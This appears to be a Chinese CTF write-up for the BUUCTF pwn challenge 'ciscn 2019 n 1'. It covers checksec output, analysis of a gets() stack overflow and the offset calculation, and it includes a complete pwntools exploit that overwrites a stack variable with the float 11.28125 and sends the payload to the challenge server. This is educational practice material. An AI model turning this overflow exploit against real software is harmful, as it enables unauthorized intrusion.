---
author: 
  name: Zephyr
title: ciscn 2019 n 1
date: 2022-3-19 20:30:09
permalink: /pages/2e944742e534d18b
tags: 
  - buuctf

---

# ciscn 2019 n 1

## 前提

### 查看文件保护

```shell
root@localhost ~# checksec ciscn_2019_n_1
[*] '/root/ciscn_2019_n_1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## 静态分析

主函数未发现漏洞点，漏洞在函数func如图

![iswb23](https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/blog/iswb23.png)

发现溢出函数gets，另外若v2==11.28125成立，则直接可获得flag

## 思路分析

1. 分析:
   - v1处可溢出
   - v1与v2同时是栈上变量
   - v2=0
   - 当v2=11.28125时可直接获得flag
   - v1地址比v2高
2. 思路:
   - 从v1直接溢出到v2处将v2修改为11.28125以获得flag

## 确定偏移量

- 通过ida及简单的调试可知从v1到v2的偏移量为0x30-4

## 问题

### pwntools中的flat无法打包float值

需要进行手动转换处理

```python
import struct
v1 = 11.28125
v1 = int(hex(struct.unpack('<I', struct.pack('<f', v1))[0]), 16)  # 4字节浮点数转16进制
```

## exp

```python
from pwn import *
import struct
context(os='linux', arch='amd64', log_level='debug')
pwnfile = '/root/pwn/buuctf/ciscn_2019_n_1/ciscn_2019_n_1'
# io = process(pwnfile)
io = remote('node4.buuoj.cn', 27944)
padding = 0x30-4
v1 = 11.28125
v1 = int(hex(struct.unpack('<I', struct.pack('<f', v1))[0]), 16)  # 4字节浮点数转16进制
payload = flat(['a'*padding, v1])
io.recv()
io.sendline(payload)
io.interactive()
```